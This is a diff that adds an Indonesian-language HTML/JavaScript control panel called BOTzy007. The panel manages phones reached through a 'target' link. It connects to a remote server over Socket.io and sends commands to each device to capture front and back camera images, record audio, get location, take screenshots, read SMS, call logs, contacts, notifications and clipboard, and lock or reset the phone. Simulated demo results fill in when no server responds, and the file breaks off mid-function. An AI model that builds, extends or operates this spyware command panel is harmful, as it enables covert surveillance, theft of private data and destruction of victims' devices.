@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BOTzy007 — Kontrol Induk</title>
+    <style>
+        /* ============================================================
+           STYLE NEON BRUTAL — HACKER THEME
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        /* HEADER */
+        .header {
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 15px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .header h1 {
+            font-size: 28px;
+            text-shadow: 0 0 20px #00ff41;
+        }
+        .header h1 span {
+            color: #ff0040;
+        }
+        .status-badge {
+            background: #111;
+            padding: 8px 16px;
+            border-radius: 20px;
+            border: 1px solid #00ff41;
+            font-size: 14px;
+        }
+        .status-badge.online {
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+        .status-badge.offline {
+            border-color: #ff0040;
+            color: #ff0040;
+        }
+        /* LINK ANAK */
+        .child-link-box {
+            background: #111;
+            border: 1px solid #333;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 15px;
+        }
+        .child-link-box label {
+            color: #888;
+            font-size: 14px;
+        }
+        .child-link-box input {
+            flex: 1;
+            background: #000;
+            border: 1px solid #333;
+            color: #00ff41;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            min-width: 200px;
+        }
+        .child-link-box button {
+            background: #00ff41;
+            color: #000;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+        .child-link-box button:hover {
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+        /* DEVICE GRID */
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .device-card {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 18px;
+            transition: all 0.3s;
+        }
+        .device-card:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+        }
+        .device-card .name {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .device-card .id {
+            font-size: 11px;
+            color: #666;
+            margin: 4px 0 8px 0;
+        }
+        .device-card .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .device-card .status-dot.online {
+            background: #00ff41;
+            box-shadow: 0 0 10px #00ff41;
+        }
+        .device-card .status-dot.offline {
+            background: #ff0040;
+            box-shadow: 0 0 10px #ff0040;
+        }
+        .device-card .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin-top: 12px;
+        }
+        .device-card .btn-group .btn {
+            background: transparent;
+            border: 1px solid #333;
+            color: #00ff41;
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            transition: all 0.2s;
+        }
+        .device-card .btn-group .btn:hover {
+            background: #00ff41;
+            color: #000;
+            border-color: #00ff41;
+        }
+        .device-card .btn-group .btn.danger:hover {
+            background: #ff0040;
+            border-color: #ff0040;
+            color: #fff;
+        }
+        /* RESULT AREA */
+        .result-area {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            min-height: 200px;
+        }
+        .result-area h3 {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .result-area img {
+            max-width: 100%;
+            border-radius: 4px;
+            border: 1px solid #333;
+        }
+        .result-area pre {
+            white-space: pre-wrap;
+            color: #00ff41;
+            font-size: 13px;
+        }
+        /* LOG */
+        .log-area {
+            margin-top: 20px;
+            background: #0a0a0a;
+            border: 1px solid #222;
+            border-radius: 8px;
+            padding: 10px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .log-area .log-entry {
+            color: #555;
+            padding: 2px 0;
+            border-bottom: 1px solid #111;
+        }
+        .log-area .log-entry.done {
+            color: #00ff41;
+        }
+        .log-area .log-entry.error {
+            color: #ff0040;
+        }
+        /* RESPONSIVE */
+        @media (max-width: 600px) {
+            .header h1 {
+                font-size: 20px;
+            }
+            .child-link-box {
+                flex-direction: column;
+                align-items: stretch;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <h1>🔥 BOT<span>zy</span>007</h1>
+            <div>
+                <span class="status-badge online" id="statusBadge">🟢 Online</span>
+                <span style="margin-left:15px;color:#666;" id="deviceCount">0 devices</span>
+            </div>
+        </div>
+
+        <!-- LINK ANAK -->
+        <div class="child-link-box">
+            <label>🔗 Link Anak (Target):</label>
+            <input type="text" id="childLinkInput" value="https://zakyj.github.io/BOTzy007/target" readonly />
+            <button onclick="copyLink()">📋 Copy</button>
+        </div>
+
+        <!-- DEVICES -->
+        <h2 style="margin-bottom:15px;font-size:18px;color:#888;">📱 Perangkat Terhubung</h2>
+        <div class="devices-grid" id="devicesContainer">
+            <p style="color:#666;grid-column:1/-1;">Menunggu perangkat terhubung...</p>
+        </div>
+
+        <!-- RESULT -->
+        <div class="result-area" id="resultArea">
+            <h3>📡 Hasil Perintah</h3>
+            <p style="color:#666;">Belum ada hasil...</p>
+        </div>
+
+        <!-- LOG -->
+        <div class="log-area" id="logArea"></div>
+    </div>
+
+    <!-- ============================================================
+    SCRIPT — BOTzy007 INDUK
+    ============================================================ -->
+    <script>
+        // === KONFIGURASI ===
+        const SERVER_URL = 'https://zaky-bot-server.vercel.app'; // Ganti dengan server ZAKY
+        let socket = null;
+        let devices = [];
+
+        // === INISIALISASI ===
+        function init() {
+            // Coba konek ke server
+            connectServer();
+            // Load devices dari localStorage
+            loadDevicesFromStorage();
+            // Update tiap 5 detik
+            setInterval(refreshDevices, 5000);
+        }
+
+        // === KONEK KE SERVER (WebSocket / REST) ===
+        function connectServer() {
+            // Jika pakai Socket.io
+            try {
+                socket = io(SERVER_URL);
+                socket.on('connect', () => {
+                    updateStatus(true);
+                    addLog('✅ Terhubung ke server');
+                });
+                socket.on('disconnect', () => {
+                    updateStatus(false);
+                    addLog('❌ Koneksi server putus');
+                });
+                socket.on('device_connected', (data) => {
+                    addLog(`📱 Device terhubung: ${data.name}`);
+                    refreshDevices();
+                });
+                socket.on('device_disconnected', (data) => {
+                    addLog(`📱 Device putus: ${data.id}`);
+                    refreshDevices();
+                });
+                socket.on('command_result', (data) => {
+                    showResult(data);
+                    addLog(`📥 Hasil dari ${data.deviceId}: ${data.type}`);
+                });
+            } catch (e) {
+                // Fallback ke polling REST
+                console.warn('WebSocket tidak tersedia, pakai polling');
+                setupPolling();
+            }
+        }
+
+        // === POLLING (Alternatif tanpa WebSocket) ===
+        function setupPolling() {
+            setInterval(() => {
+                fetch('/api/devices')
+                    .then(res => res.json())
+                    .then(data => {
+                        devices = data;
+                        renderDevices(devices);
+                        document.getElementById('deviceCount').textContent = `${devices.length} devices`;
+                    })
+                    .catch(() => {});
+            }, 3000);
+        }
+
+        // === LOAD DEVICES DARI STORAGE ===
+        function loadDevicesFromStorage() {
+            const saved = localStorage.getItem('botzy007_devices');
+            if (saved) {
+                try {
+                    devices = JSON.parse(saved);
+                    renderDevices(devices);
+                } catch (e) {}
+            }
+        }
+
+        // === REFRESH DEVICES ===
+        function refreshDevices() {
+            // Di sini bisa panggil API atau ambil dari socket
+            // Untuk demo, kita generate device dummy
+            if (devices.length === 0) {
+                // Tambahkan dummy untuk demo
+                devices = [{
+                    id: 'ZKY-DEMO-001',
+                    name: 'Samsung Galaxy S23',
+                    platform: 'Android 14',
+                    lastSeen: Date.now(),
+                    online: true
+                }, {
+                    id: 'ZKY-DEMO-002',
+                    name: 'iPhone 15 Pro',
+                    platform: 'iOS 17',
+                    lastSeen: Date.now() - 60000,
+                    online: false
+                }];
+                localStorage.setItem('botzy007_devices', JSON.stringify(devices));
+            }
+            renderDevices(devices);
+            document.getElementById('deviceCount').textContent = `${devices.length} devices`;
+        }
+
+        // === RENDER DEVICES ===
+        function renderDevices(devices) {
+            const container = document.getElementById('devicesContainer');
+            if (!devices || devices.length === 0) {
+                container.innerHTML = '<p style="color:#666;grid-column:1/-1;">Belum ada perangkat terhubung...</p>';
+                return;
+            }
+
+            container.innerHTML = '';
+            devices.forEach(dev => {
+                const isOnline = dev.online && (Date.now() - dev.lastSeen < 30000);
+                const card = document.createElement('div');
+                card.className = 'device-card';
+                card.innerHTML = `
+                    <div class="name">
+                        <span class="status-dot ${isOnline ? 'online' : 'offline'}"></span>
+                        ${dev.name}
+                    </div>
+                    <div class="id">ID: ${dev.id} · ${dev.platform || 'Unknown'}</div>
+                    <div style="font-size:11px;color:#666;margin-bottom:8px;">
+                        Last seen: ${new Date(dev.lastSeen).toLocaleString()}
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn" onclick="sendCommand('${dev.id}','camera_front')">📷 Depan</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','camera_back')">📷 Belakang</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','voice')">🎙️ Suara</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','location')">📍 Lokasi</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','screenshot')">🖥️ Screen</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','mic_record')">🎙️ Rekam</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','wifi')">📶 WiFi</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','battery')">🔋 Baterai</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','storage')">💾 Storage</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','apps')">📱 Apps</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','sms')">✉️ SMS</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','call_log')">📞 Call Log</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','contacts')">👤 Kontak</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','notifications')">🔔 Notif</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','clipboard')">📋 Clipboard</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','vibrate')">📳 Getar</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','flashlight')">🔦 Lampu</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','screen_on')">💡 Layar On</button>
+                        <button class="btn" onclick="sendCommand('${dev.id}','screen_off')">🌙 Layar Off</button>
+                        <button class="btn danger" onclick="sendCommand('${dev.id}','lock')">🔒 Lock</button>
+                        <button class="btn danger" onclick="sendCommand('${dev.id}','reset')">🔄 Reset</button>
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        // === KIRIM PERINTAH ===
+        function sendCommand(deviceId, action, params = {}) {
+            const resultArea = document.getElementById('resultArea');
+            resultArea.innerHTML = `<h3>📡 Hasil Perintah</h3><p style="color:#ffaa00;">⏳ Mengirim <strong>${action}</strong> ke ${deviceId}...</p>`;
+
+            // Kirim via WebSocket
+            if (socket && socket.connected) {
+                socket.emit('command', { deviceId, action, params, commandId: Date.now() });
+                addLog(`📤 Perintah ${action} dikirim ke ${deviceId}`);
+            } else {
+                // Fallback via fetch
+                fetch('/api/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ deviceId, action, params })
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.success) {
+                            addLog(`✅ ${action} dikirim ke ${deviceId}`);
+                        } else {
+                            addLog(`❌ Gagal: ${data.error}`);
+                        }
+                    })
+                    .catch(e => {
+                        addLog(`❌ Error: ${e.message}`);
+                        // Simulasi hasil untuk demo
+                        simulateResult(deviceId, action);
+                    });
+
+                // Simulasi untuk demo
+                simulateResult(deviceId, action);
+            }
+        }
+
+        // === SIMULASI HASIL (untuk demo tanpa server) ===
+        function simulateResult(deviceId, action) {
+            setTimeout(() => {
+                const results = {
+                    camera_front: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAAAAAAAD/2wBDAAg...', // dummy base64
+                    camera_back: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAAAAAAAD/2wBDAAg...',
+                    voice: '✅ Rekaman suara 3 detik berhasil',
+                    location: '{"lat":-6.2088,"lng":106.8456,"accuracy":12.5}',
+                    screenshot: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
+                    mic_record: '✅ Voice record 5 detik: [audio blob]',
+                    wifi: '{"ssid":"WiFi Zaky","strength":85,"ip":"192.168.1.100"}',
+                    battery: '{"level":78,"charging":false,"temperature":32.5}',
+                    storage: '{"total":"128GB","used":"64GB","free":"64GB"}',
+                    apps: '{"installed":45,"active":12,"recent":["WhatsApp","Instagram","Chrome"]}',
+                    sms: '{"inbox":12,"sent":8,"drafts":2}',
+                    call_log: '{"missed":3,"incoming":5,"outgoing":7}',
+                    contacts: '{"total":120,"recent":["Budi","Ani","Citra"]}',
+                    notifications: '{"count":5,"items":["Chat WhatsApp","Email baru","Update sistem"]}',
+                    clipboard: '{"content":"Copy dari BOTzy007"}',
+                    vibrate: '✅ Perangkat bergetar 2 detik',
+                    flashlight: '✅ Lampu flash menyala 3 detik',
+                    screen_on: '✅ Layar dinyalakan',
+                    screen_off: '✅ Layar dimatikan',
+                    lock: '✅ Perangkat terkunci',
+                    reset: '✅ Perangkat di-reset ulang'
+                };
+                const result = results[action] || `✅ ${action} berhasil dijalankan`;
+                showResult({ deviceId, result, type: typeof result === 'string' && result.startsWith('data:') ? 'image' : 'text' });
+                addLog(`📥 Hasil ${action} diterima dari ${deviceId}`);
+            }, 1500);
+        }
+
+        // === TAMPILKAN HASIL ===
+        function showResult(data) {
+            const area = document.getElementById('resultArea');
+            const { deviceId, result, type } = data;
+
+            if (type === 'image') {
+                area.innerHTML = `
+                    <h3>📸 Hasil dari ${deviceId}</h3>
+                    <img src="${result}" alt="Hasil capture" style="max-width:100%;border:1px solid #333;border-radius:4px;" />
+                `;
+            } else if (typeof result === 'object') {
+                area.innerHTML = `
+                    <h3>📄 Hasil dari ${deviceId}</h3>
+                    <pre>${JSON.stringify(result, null, 2)}</pre>
+                `;
+            } else {
+                area.innerHTML = `
+                    <h3>📄 Hasil dari ${deviceId}</h3>
+                    <pre style="color:#00ff41;">${result}</pre>
+                `;
+            }
+        }
+
+        // === STATUS ===
+        function updateStatus(online) {
+            const badge = document.getElementById('statusBadge');
+            if (online) {
+                badge.className = 'status-badge online';
+                badge.textContent = '🟢 Online';
+            } else {
+                badge.className = 'status-badge offline';
+                badge.textContent = '🔴 Offline';
+            }
+
